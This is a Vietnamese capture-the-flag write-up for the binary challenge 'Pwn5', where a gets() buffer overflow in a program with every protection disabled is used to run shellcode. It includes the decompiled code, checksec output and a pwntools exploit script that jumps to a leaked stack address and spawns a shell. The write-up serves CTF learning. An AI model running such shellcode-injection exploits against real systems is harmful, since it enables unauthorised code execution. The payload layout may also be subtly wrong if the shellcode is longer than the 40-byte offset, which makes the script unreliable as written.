---
title: "Pwn5 - MiniCTF - PTITHCM"
date: 2024-01-07 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, shellcode, gets, stack-overflow, ptithcm]
author: datious
description: "MiniCTF PTITHCM Pwn5 writeup — phương pháp khai thác tương tự Pwn4, shellcode injection qua gets() buffer overflow."
---

# Pwn5 - MiniCTF - PTITHCM
**Author: D1n0_09-N24DCAT015**

Bài pwn5 này có phương pháp khai thác tương tự **Pwn4**.

## 1. Tìm lỗ hổng

Giải nén ta được các thư mục chứa các file:

![Files](https://hackmd.io/_uploads/Sy4hhallWe.png)

Dùng **pwninit** để patch binary với libc. Chạy thử file patched:

```
(pwnenv)─(kali㉿kali)-[~/Downloads/pwn5]
└─$ ./chall_patched 
0x7ffcd3ef37d0: 0000000000000000  <- rsp
0x7ffcd3ef37d8: 00007fac2ae354e0 
0x7ffcd3ef37e0: 00007ffcd3ef3820 
0x7ffcd3ef37e8: 00007fac2ac9d451 
0x7ffcd3ef37f0: 00007ffcd3ef3890  <- rbp
0x7ffcd3ef37f8: 00007fac2ac2a575 
Input: 
```

→ Chương trình leak **địa chỉ stack** — đây là vị trí ta sẽ nhảy vào.

### Source code (Ghidra)

```c
int main(void)
{
  char buf [32];
  
  dump_stack();
  printf("Input: ");
  gets(buf);        // ← Buffer Overflow
  printf("Output: ");
  printf(buf);
  putchar(10);
  dump_stack();
  return 0;
}
```

## 2. Security Layers (checksec)

```
gef➤  checksec
[+] checksec for '/home/kali/Downloads/pwn5/chall_patched'
Canary    : ✘ 
NX        : ✘ 
PIE       : ✘ 
Fortify   : ✘ 
RelRO     : Partial
```

→ Tất cả bảo vệ **đều tắt** → shellcode trực tiếp hoạt động.

## 3. Exploit Script

```python
#!/usr/bin/python3
from pwn import *

p = process('./chall_patched')

# Parse địa chỉ buf từ dump_stack output (dòng đầu: <- rsp)
output = p.recvuntil("Input: ").decode()
first_line = output.strip().split('\n')[0]
buf_addr = int(first_line.split(':')[0].strip(), 16)
log.info(f"buf @ {hex(buf_addr)}")

# Shellcode
shellcode = asm(shellcraft.amd64.sh(), arch='amd64')

# Payload: shellcode + padding + RIP = buf
offset = 40
payload  = shellcode
payload  = payload.ljust(offset, b'A')
payload += p64(buf_addr)

p.sendline(payload)
p.interactive()
```

> **Note:** Phương pháp giống hệt Pwn4. Chỉ khác là libc version có thể khác nhau, cần patch lại bằng `pwninit`.
